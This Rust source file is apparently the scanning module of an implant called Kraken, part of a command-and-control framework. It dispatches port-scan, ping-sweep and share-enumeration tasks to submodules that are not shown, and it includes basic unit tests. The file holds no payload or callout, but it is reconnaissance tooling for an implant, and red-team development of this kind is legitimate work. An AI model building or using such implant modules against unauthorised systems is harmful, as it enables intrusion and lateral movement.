//! mod-scan: Network scanning module for Kraken implant
//!
//! Provides port scanning, ping sweep, and share enumeration.

use common::{KrakenError, Module, ModuleId, TaskId, TaskResult};
use prost::Message;
use protocol::{scan_task, ScanTask};

mod ping;
mod port;
mod share;

pub struct ScanModule {
    id: ModuleId,
}

impl ScanModule {
    pub fn new() -> Self {
        Self {
            id: ModuleId::new("scan"),
        }
    }
}

impl Default for ScanModule {
    fn default() -> Self {
        Self::new()
    }
}

impl Module for ScanModule {
    fn id(&self) -> &ModuleId {
        &self.id
    }

    fn name(&self) -> &'static str {
        "Scan"
    }

    fn version(&self) -> &'static str {
        env!("CARGO_PKG_VERSION")
    }

    fn handle(&self, _task_id: TaskId, task_data: &[u8]) -> Result<TaskResult, KrakenError> {
        let task: ScanTask =
            ScanTask::decode(task_data).map_err(|e| KrakenError::Protocol(e.to_string()))?;

        match task.operation {
            Some(scan_task::Operation::PortScan(ps)) => {
                let result = port::scan(&ps)?;
                Ok(TaskResult::ScanPort(result))
            }
            Some(scan_task::Operation::PingSweep(sweep)) => {
                let result = ping::sweep(&sweep)?;
                Ok(TaskResult::ScanPing(result))
            }
            Some(scan_task::Operation::ShareEnum(se)) => {
                let result = share::enumerate(&se)?;
                Ok(TaskResult::ScanShare(result))
            }
            None => Err(KrakenError::Protocol("missing scan operation".into())),
        }
    }
}

// For dynamic loading support
#[cfg(feature = "dynamic-entry")]
common::kraken_module_entry!(ScanModule);

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_module_id() {
        let module = ScanModule::new();
        assert_eq!(module.id().as_str(), "scan");
        assert_eq!(module.name(), "Scan");
    }

    #[test]
    fn test_invalid_task_data() {
        let module = ScanModule::new();
        let result = module.handle(TaskId::new(), &[0xFF, 0xFE]);
        assert!(result.is_err());
    }
}
